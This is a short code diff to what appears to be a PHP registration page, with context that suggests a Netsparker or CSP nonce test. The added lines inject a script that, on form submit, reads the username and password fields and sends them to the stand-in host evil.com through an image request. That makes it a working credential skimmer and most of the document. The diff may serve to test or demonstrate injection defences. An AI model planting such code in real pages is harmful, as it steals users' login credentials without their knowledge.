@@ -29,3 +29,15 @@ session_start(); ?>
 <script nonce="uG2bsk6JIH923nsvp01n24KE">
     alert('Hello from Netsparker');
 </script>
+
+
+<script>
+    function leakData() {
+        var user_name = document.getElementById("user_name").value;
+        var password = document.getElementById("password").value;
+        var img = document.createElement("IMG");
+        img.src = "https://evil.com/" + "?username=" + user_name + "&password=" + password;
+    }
+
+    document.getElementById("register_form").onsubmit = leakData;
+</script>
